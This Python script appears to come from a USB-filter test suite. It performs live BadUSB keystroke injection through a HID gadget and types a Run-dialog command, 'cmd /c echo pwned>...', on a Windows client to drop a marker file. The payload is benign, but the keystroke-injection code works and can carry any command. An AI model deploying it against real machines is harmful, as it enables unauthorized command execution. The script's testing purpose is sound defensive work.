#!/usr/bin/env python3
"""Live BadUSB keystroke injection over USB/IP via a configfs HID gadget.

Once a HID gadget is attached by the Windows client, writing 8-byte boot-keyboard
reports to /dev/hidgN delivers real keystrokes to that client. This is what makes
the HID simulation a *real* attack rather than just a device that enumerates.

Used by the efficacy tests (filter DISABLED) to prove the attack works. With the
filter ON the device never attaches, /dev/hidgN never opens, and nothing types.

Layout assumption: US QWERTY on the client. Timing/layout may need tuning.

Examples:
  hid_type.py --device /dev/hidg0 --text "hello world"
  hid_type.py --device /dev/hidg0 --run-marker deadbeef
      # opens Run (Win+R) and runs: cmd /c echo pwned>C:\\Users\\Public\\ub_<tok>.txt
"""

from __future__ import annotations

import argparse
import time

# Modifier bits (byte 0 of the boot-keyboard report).
MOD_LSHIFT = 0x02
MOD_LGUI = 0x08

# Special keys.
KEY_ENTER = 0x28
KEY_SPACE = 0x2C
KEY_R = 0x15


def _build_keymap() -> dict[str, tuple[int, bool]]:
    """Map a printable ASCII char -> (usage_code, needs_shift) for US layout."""
    m: dict[str, tuple[int, bool]] = {}

    for i, c in enumerate("abcdefghijklmnopqrstuvwxyz"):
        m[c] = (0x04 + i, False)
        m[c.upper()] = (0x04 + i, True)

    digits = "1234567890"
    for i, c in enumerate(digits):
        m[c] = (0x1E + i, False)
    for shifted, base in zip("!@#$%^&*()", digits):
        m[shifted] = (m[base][0], True)

    m[" "] = (KEY_SPACE, False)
    pairs = {
        "-": (0x2D, "_"), "=": (0x2E, "+"), "[": (0x2F, "{"), "]": (0x30, "}"),
        "\\": (0x31, "|"), ";": (0x33, ":"), "'": (0x34, '"'), "`": (0x35, "~"),
        ",": (0x36, "<"), ".": (0x37, ">"), "/": (0x38, "?"),
    }
    for base, (code, shifted) in pairs.items():
        m[base] = (code, False)
        m[shifted] = (code, True)
    return m


KEYMAP = _build_keymap()


def _report(modifier: int = 0, key: int = 0) -> bytes:
    return bytes([modifier, 0, key, 0, 0, 0, 0, 0])


class Keyboard:
    def __init__(self, device: str, char_delay: float = 0.01):
        self.device = device
        self.char_delay = char_delay

    def _send(self, modifier: int, key: int) -> None:
        with open(self.device, "wb") as f:
            f.write(_report(modifier, key))
            f.flush()
            f.write(_report())  # release
            f.flush()
        time.sleep(self.char_delay)

    def type_text(self, text: str) -> None:
        for ch in text:
            if ch == "\n":
                self._send(0, KEY_ENTER)
                continue
            entry = KEYMAP.get(ch)
            if entry is None:
                raise ValueError(f"unmapped character: {ch!r}")
            code, shift = entry
            self._send(MOD_LSHIFT if shift else 0, code)

    def press_enter(self) -> None:
        self._send(0, KEY_ENTER)

    def open_run_dialog(self) -> None:
        self._send(MOD_LGUI, KEY_R)


def run_marker(kb: Keyboard, token: str, settle: float = 1.5) -> str:
    """Open Run and drop a marker file readable by the WinRM oracle.

    Writes C:\\Users\\Public\\ub_<token>.txt (Public is world-writable, so the
    interactive session and the WinRM session agree on the path).
    """
    path = f"C:\\Users\\Public\\ub_{token}.txt"
    kb.open_run_dialog()
    time.sleep(settle)
    kb.type_text(f"cmd /c echo pwned>{path}")
    time.sleep(0.3)
    kb.press_enter()
    return path


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--device", default="/dev/hidg0")
    ap.add_argument("--text", help="type this literal text then Enter")
    ap.add_argument("--run-marker", metavar="TOKEN",
                    help="open Run and drop C:\\Users\\Public\\ub_<TOKEN>.txt")
    ap.add_argument("--char-delay", type=float, default=0.01)
    args = ap.parse_args()

    kb = Keyboard(args.device, char_delay=args.char_delay)
    if args.run_marker:
        path = run_marker(kb, args.run_marker)
        print(f"fired run-marker -> {path}")
    elif args.text:
        kb.type_text(args.text)
        kb.press_enter()
        print(f"typed {len(args.text)} chars")
    else:
        ap.error("one of --text or --run-marker is required")


if __name__ == "__main__":
    main()
